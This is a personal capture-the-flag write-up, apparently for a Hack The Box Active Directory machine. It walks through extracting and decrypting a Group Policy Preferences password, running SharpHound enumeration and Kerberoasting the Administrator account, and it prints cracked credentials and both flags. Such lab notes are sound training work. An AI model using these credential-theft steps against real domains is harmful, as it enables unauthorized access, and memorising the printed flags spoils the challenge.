
# IP: 10.129.23.70


- host is discoverable. 
- Add the host to /etc/hosts



![[Pasted image 20260105142903.png]]


We can list shares and find Replication share is publicly accessible:

We access the Replication share and find `Groups.xml` file. 

`Group Policy Preferences (GPP) `was introduced in Windows Server 2008, and among many other features, allowed administrators to modify users and groups across their network. An example use case is where a company’s gold image had a weak local administrator password, and administrators wanted to retrospectively set it to something stronger. The defined password was AES-256 encrypted and stored in `Groups.xml` . However, at some point in 2012, Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low-hanging fruit.

We extract the encrypted password form the Groups.xml file and decrypt it using gpp-decrypt.

![[Pasted image 20260105152158.png]]


# Creds From Groups.XML

`Username:` active.htb\SVC_TGS
`Password`:  GPPstillStandingStrong2k18



Now that we have a pair of creds, we re-run SMB enum:

```powershell
nxc smb $ip -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```




Since we can access shares, we can run blood hound from windows as well:


```powershell
# Run a cmd session as the acitve.htb\SVC_TGS user
runas /netonly /user:active.htb\SVC_TGS cmd
# It'll prompt for password. 


# Change DNS settings of VPN/Ethernet interfaces to point to the server:
Server IP: 10.129.25.72

# Test your connection
dir //10.129.25.72/Users # Users is an accesable share
#if this works, we can run bloodhound. 


# Run Sharphound in the SVC_TGS cmd session:
.\SharpHound.exe -c all -d active.htb --domaincontroller 10.129.25.72


# Move the collected ZIP file and analyze it with blood hound. 
```





BloodHound shows there's a kerberoastable Administrator user:

![[Pasted image 20260107190229.png]]



So use impacket to get its hash:

![[Pasted image 20260107185954.png]]


Crack the hash:

![[Pasted image 20260107190031.png]]


# Creds: 

Administrator:Ticketmaster1968



# Flags:
`User Flag`:  2ae6a56ae7d31d11eb7f0d1b7a8f2a3c
`Root Flag: `6f1a83af382a23a0c3c6488c7e8a881d

